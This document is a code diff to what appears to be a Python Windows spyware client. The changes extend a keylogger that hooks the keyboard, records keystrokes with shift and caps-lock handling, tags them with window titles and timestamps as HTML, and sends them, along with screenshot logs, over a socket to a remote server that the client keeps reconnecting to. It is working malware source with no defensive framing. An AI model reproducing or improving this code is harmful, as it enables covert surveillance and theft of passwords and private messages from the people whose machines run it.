@@ -36,7 +36,6 @@ AUDIO_LOGS = {}
 
 GLOBAL_SOCKET = None
 CURRENT_WINDOW_TITLE = None
-WINDOW_TITLE_COUNTER = 0
 
 uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
@@ -96,6 +95,25 @@ class BITMAPINFO(ctypes.Structure):
 
 bmp_info = BITMAPINFO()
 
+shiftcodes = {
+    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
+    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
+    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
+    186: ':', 222: '"', 188: '&lsaquo;', 190: '&rsaquo;', 191: '?',
+}
+keycodes = {
+    160: '', 161: '', 32: '&nbsp;',
+    9: '<font color=#288DA1>{tab}</font>', 8: '<font color=#D32B4E>{del}</font>', 162: '', 163: '', 144: '',
+    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>',
+}
+updatecode = {
+    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
+    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
+    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
+    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
+    111: '/', 106: '*', 109: '-', 107: '+',
+    110: '.'
+}
 
 # Init Processes Variables
 EnumProcesses = Psapi.EnumProcesses
@@ -135,7 +153,11 @@ def get_date_time():
     now = datetime.datetime.now()
     year = now.year
     month = now.month
+    if len(str(month)) < 2:
+        month = '0'+str(month)
     day = now.day
+    if len(str(day)) < 2:
+        month = '0'+str(day)
     hour = now.hour
     minute = now.minute
     second = now.second
@@ -163,13 +185,15 @@ def screen_bits():
 def send_keylog():
     global GLOBAL_SOCKET
     global ACTIVE
+    global CURRENT_WINDOW_TITLE
     global KEY_LOGS
 
     config = init()
     if config['kts'] and len(KEY_LOGS) > 0 and ACTIVE:
-        for i in KEY_LOGS.keys():
-            data_send(GLOBAL_SOCKET, str(KEY_LOGS[i]), 'keyloggerLogs')
+        CURRENT_WINDOW_TITLE = ''
+        keys_for_send = str(KEY_LOGS)
         KEY_LOGS = {}
+        data_send(GLOBAL_SOCKET, keys_for_send, 'keyloggerLogs')
     key_scheduler = sched.scheduler(time.time, time.sleep)
     key_scheduler.enter(config['kt'], 1, send_keylog, ())
     key_scheduler.run()
@@ -179,12 +203,9 @@ def send_screenshot():
     global GLOBAL_SOCKET
     global ACTIVE
     global SCREENSHOT_LOGS
-    global CURRENT_WINDOW_TITLE
 
     config = init()
     if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
-
-        CURRENT_WINDOW_TITLE = ''
         for i in SCREENSHOT_LOGS.keys():
             data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
         SCREENSHOT_LOGS = {}
@@ -239,25 +260,45 @@ class Key(threading.Thread):
 
         global KEY_LOGS
 
+    def update_key(self, k):
+        if updatecode.has_key(k):
+            return updatecode[k]
+        else:
+            return str(chr(k))
+
     def write_key(self, log):
         global CURRENT_WINDOW_TITLE
-        global WINDOW_TITLE_COUNTER
 
         new_window_title = get_window_title()
-        if CURRENT_WINDOW_TITLE == new_window_title and KEY_LOGS.has_key(WINDOW_TITLE_COUNTER):
-                KEY_LOGS[WINDOW_TITLE_COUNTER]['logs'] += log
+
+        if CURRENT_WINDOW_TITLE == new_window_title:
+            KEY_LOGS['logs'] += log
         else:
-            WINDOW_TITLE_COUNTER += 1
-            KEY_LOGS[WINDOW_TITLE_COUNTER] = {}
-            KEY_LOGS[WINDOW_TITLE_COUNTER]['window_title'] = new_window_title
-            KEY_LOGS[WINDOW_TITLE_COUNTER]['time'] = get_date_time()
-            KEY_LOGS[WINDOW_TITLE_COUNTER]['logs'] = log
+            if KEY_LOGS.has_key('logs'):
+                KEY_LOGS['logs'] += '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log
+            else:
+                KEY_LOGS['logs'] = '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log
             CURRENT_WINDOW_TITLE = new_window_title
 
     def hook_proc(self, n_code, w_param, l_param):
         if w_param is not 0x0100:
             return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
-        self.write_key((User32.GetKeyState(0x14) & 1, User32.GetKeyState(0x10) & 0x8000, l_param[0]))
+
+        if keycodes.has_key(l_param[0]):
+            key = keycodes[l_param[0]]
+        else:
+            if User32.GetKeyState(0x14) & 1:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).lower()
+                else:
+                    key = self.update_key(l_param[0]).upper()
+            else:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else self.update_key(l_param[0]).upper()
+                else:
+                    key = self.update_key(l_param[0]).lower()
+
+        self.write_key(key)
         return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
     def start_keylogger(self):
@@ -363,6 +404,7 @@ def data_receive(sock, end='[ENDOFMESSAGE]'):
 # Send Data Function
 def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
     global ID
+    global ACTIVE
     message = {
         'payload': message,
         'mode': mode,
@@ -372,7 +414,9 @@ def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
     }
     try:
         sock.sendall(str(message)+end)
+        ACTIVE = True
     except socket.error:
+        ACTIVE = False
         return
 
 
@@ -441,6 +485,7 @@ def reactor():
             server_socket.connect((HOST, PORT))
             ACTIVE = True
         except:
+            ACTIVE = False
             time.sleep(5)
             continue
 
